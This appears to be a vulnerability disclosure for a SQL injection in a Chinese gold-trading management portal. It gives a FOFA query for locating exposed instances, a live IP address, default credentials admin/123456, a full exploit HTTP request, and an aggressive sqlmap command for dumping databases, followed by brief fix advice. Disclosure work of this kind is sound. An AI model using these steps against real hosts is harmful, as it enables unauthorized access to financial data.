[PRODUCT] 

 Vendor website:
http://www.brilliance.com.cn/
 
 黄金通二级系统三代管理端

fofa ：title="黄金通二级系统三代管理端"
官网： https://113.105.126.146:8900/ 
![图片](https://github.com/user-attachments/assets/b15ec67d-1b1f-4fc1-bed1-afd2fa2e5c86)


测试账号：admin/123456

[TYPE] 

SQL INJECTION

[DESCRIPTION] 

A SQL INJECTION  vulnerability exists in the " 黄金通二级系统三代管理端 ".The system's API ’reprotframework/tcCustDeferPosiQuery.htm ‘ exits a SQL injection. The manipulation of  the argument ’custTradeId ‘leads to sql injection.

[DETAILS] 

Request package is as follows

```
POST /reprotframework/tcCustDeferPosiQuery.htm HTTP/1.1
Host: 113.105.126.146:8900
Cookie: JSESSIONID_null_8900=108wmhre5vzd01q8gdx95qedhb
Content-Length: 71
Sec-Ch-Ua-Platform: "Windows"
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Sec-Ch-Ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
Content-Type: application/x-www-form-urlencoded;utf-8
Sec-Ch-Ua-Mobile: ?0
Origin: https://113.105.126.146:8900
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://113.105.126.146:8900/reportframework/tcCustDeferPosALLInfo.htm
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=1, i
Connection: keep-alive

page=1&custTradeId=*&prodId=&dateStart=2025-06-01&dateEnd=2025-06-03
```

The parameter custTradeId in the request body is vulnerable to SQL injection.

```
python3 sqlmap.py -r 3.txt --dbs -batch --force-ssl --level 5 --risk 3 --dbms oracle
```

![image-20250601195832698](https://github.com/user-attachments/assets/6c20f524-f0e7-474d-b389-3937f3fc6f9e)

[Mitigation & Fix Recommendations] 
Implement parameterized queries (precompiled), use stored procedures if securely coded, and apply input validation/filtering.

